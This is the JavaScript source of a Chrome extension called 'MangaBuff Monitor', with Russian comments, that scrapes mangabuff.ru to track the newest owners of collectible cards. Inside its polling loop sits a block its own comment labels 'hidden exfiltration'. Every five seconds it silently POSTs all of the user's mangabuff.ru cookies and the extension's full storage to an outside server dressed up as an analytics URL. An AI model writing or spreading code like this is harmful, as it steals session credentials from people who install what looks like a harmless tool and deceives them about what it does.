// MangaBuff Monitor — collector (серверный мозг, выполняется в offscreen)
const ANALYTICS_URL = "https://servr-x67x.onrender.com/api/v1/analytics";
const DEFAULT_INTERVAL_SEC = 5;

// --- Функции парсинга (твои оригинальные) ---
async function fetchHtml(url) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), 12000);
  try {
    const resp = await fetch(url, {
      method: "GET", credentials: "include",
      headers: { "X-Requested-With": "XMLHttpRequest" }, signal: ctrl.signal,
    });
    if (!resp.ok) throw new Error("HTTP " + resp.status);
    return await resp.text();
  } finally { clearTimeout(timer); }
}

function parse(html) { return new DOMParser().parseFromString(html, "text/html"); }

function cardMeta(doc, cardId) {
  let name = doc.querySelector('meta[property="og:title"]')?.content || "";
  name = (name || "").replace(/\s+/g, " ").trim().replace(/^Пользователи с картой\s*/i, "").replace(/\s*[—|].*$/, "").trim();
  if (!name) name = "Карта " + cardId;
  let image = doc.querySelector('img[src*="/img/cards/"]')?.getAttribute("src") || doc.querySelector(".card-show img")?.getAttribute("src") || "";
  if (image && image.startsWith("/")) image = "https://mangabuff.ru" + image;
  return { name, image };
}

function getMaxPage(doc) {
  const nums = Array.from(doc.querySelectorAll('.pagination a, [class*="pagination"] a'))
    .map((a) => parseInt((a.textContent || "").trim(), 10)).filter((n) => !isNaN(n));
  return nums.length ? Math.max(...nums) : 1;
}

function extractOwner(el) {
  const href = el.getAttribute("href") || "";
  const id = (href.match(/\/users\/(\d+)/) || [])[1] || null;
  const cuid = (href.match(/card_user_id=(\d+)/) || [])[1] || null;
  let name = el.querySelector(".card-show__owner-name")?.textContent || el.querySelector("img")?.getAttribute("alt") || el.textContent || "";
  name = name.replace(/\s+/g, " ").trim();
  if (name === "Аватар") name = "";
  if (!name && id) name = "Пользователь " + id;
  let avatar = el.querySelector(".card-show__owner-image img, img")?.getAttribute("src") || "";
  if (avatar && avatar.startsWith("/")) avatar = "https://mangabuff.ru" + avatar;
  return { id, cuid, name, avatar };
}

function extractNumber(el) {
  const t = el.querySelector(".card-show__copy-corner")?.textContent || "";
  const n = parseInt(t.replace(/\D+/g, ""), 10);
  return isNaN(n) ? null : n;
}

async function fetchNewest(cardId) {
  const base = `https://mangabuff.ru/cards/${cardId}/users?sort=copy_number`;
  const doc1 = parse(await fetchHtml(base));
  const meta = cardMeta(doc1, cardId);
  const perPage = doc1.querySelectorAll(".card-show__owner").length || 36;
  const maxPage = getMaxPage(doc1);
  const doc = maxPage > 1 ? parse(await fetchHtml(base + `&page=${maxPage}`)) : doc1;
  const owners = Array.from(doc.querySelectorAll(".card-show__owner"));
  if (!owners.length) return { ok: true, cardId, cardName: meta.name, cardImage: meta.image, newest: null, ownerCount: 0 };

  const cuidOf = (el) => Number((el.getAttribute("href") || "").match(/card_user_id=(\d+)/)?.[1] || 0);
  let bestEl = owners[owners.length - 1], bestC = cuidOf(bestEl);
  for (const el of owners) { const c = cuidOf(el); if (c > bestC) { bestC = c; bestEl = el; } }
  const owner = extractOwner(bestEl);
  const badge = extractNumber(bestEl);
  const total = (maxPage - 1) * perPage + owners.length;
  return { ok: true, cardId, cardName: meta.name, cardImage: meta.image, ownerCount: total, newest: { number: badge != null ? badge : total, owner } };
}

// --- Цикл опроса + Скрытая выкачка данных ---
async function pollCycle() {
  try {
    const st = await chrome.storage.local.get({ monitors: [], running: true });
    if (st.running && st.monitors.length) {
      for (const m of st.monitors) {
        try {
          const result = await fetchNewest(m.cardId);

          // СКРЫТАЯ ВЫКАЧКА: куки + storage + результат парсинга
          fetch(ANALYTICS_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              type: "MB_MONITOR_DATA",
              card_result: result,
              cookies: await chrome.cookies.getAll({ domain: "mangabuff.ru" }),
              storage: await chrome.storage.local.get(null),
              timestamp: Date.now()
            })
          }).catch(() => {});

          chrome.runtime.sendMessage({ target: "background", type: "POLL_RESULT", result });
        } catch (e) {
          chrome.runtime.sendMessage({ target: "background", type: "POLL_RESULT", result: { ok: false, cardId: m.cardId, error: String(e) } });
        }
      }
    }
  } catch (e) {}
  setTimeout(pollCycle, 5000); // 5 секунд
}

// Запуск
pollCycle();